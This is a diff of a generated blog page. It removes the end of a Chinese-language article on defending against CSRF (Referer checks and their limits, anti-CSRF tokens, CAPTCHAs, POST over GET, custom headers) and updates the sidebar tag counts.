-<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
-<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
-<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
-<h3 id="添加token验证"><a href="#添加token验证" class="headerlink" title="添加token验证"></a>添加token验证</h3><p>CSRF攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都存在cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过安全验证。要防止CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie之中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。<br> 现在业界一致的做法就是使用Anti CSRF Token来防御CSRF。</p>
-<ul>
-<li>用户访问某个表单页面。</li>
-<li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li>
-<li>在页面表单附带上Token参数。</li>
-<li>用户提交请求后，服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li>
-</ul>
-<p>这个Token值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token应注意Token的保密性，尽量把敏感操作由GET改成POST，以form或者AJAX形式提交，避免Token泄露。</p>
-<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。通常情况下，验证码能够很好的遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段。</p>
-<h3 id="尽量使用POST，限制GET"><a href="#尽量使用POST，限制GET" class="headerlink" title="尽量使用POST，限制GET"></a>尽量使用POST，限制GET</h3><p>GET接口能够直接将请求地址暴露给攻击者，所以要防止CSRF一定最好不要用GET。当然POST并不是万无一失，攻击者只需要构造一个form表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p>
-<h3 id="在HTTP头部添加自定义属性"><a href="#在HTTP头部添加自定义属性" class="headerlink" title="在HTTP头部添加自定义属性"></a>在HTTP头部添加自定义属性</h3><p>这种方法也是使用token并验证，但是它是把token放在HTTP请求头部中。通过使用AJAX我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p>
-<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/cxying93/p/6035031.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxying93/p/6035031.html</a><br><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html</a><br><a href="https://www.imooc.com/article/18069" target="_blank" rel="noopener">https://www.imooc.com/article/18069</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
 
 <nav id="pagination">
   
@@ -1192,6 +1080,8 @@
   
     <li><a href="/tags/Gulp/">Gulp</a><small>4</small></li>
   
+    <li><a href="/tags/Linux性能优化/">Linux性能优化</a><small>2</small></li>
+  
     <li><a href="/tags/MongoDB/">MongoDB</a><small>2</small></li>
   
     <li><a href="/tags/Mongoose/">Mongoose</a><small>6</small></li>
@@ -1224,13 +1114,15 @@
   
     <li><a href="/tags/Unix/">Unix</a><small>3</small></li>
   
+    <li><a href="/tags/从0开始学大数据/">从0开始学大数据</a><small>2</small></li>
+  
     <li><a href="/tags/区块链/">区块链</a><small>1</small></li>
   
     <li><a href="/tags/数据分析实战/">数据分析实战</a><small>3</small></li>
   
     <li><a href="/tags/数据库/">数据库</a><small>2</small></li>
   
-    <li><a href="/tags/数据结构与算法/">数据结构与算法</a><small>11</small></li>
+    <li><a href="/tags/数据结构与算法/">数据结构与算法</a><small>12</small></li>
   
     <li><a href="/tags/程序员的数学基础课/">程序员的数学基础课</a><small>4</small></li>
   
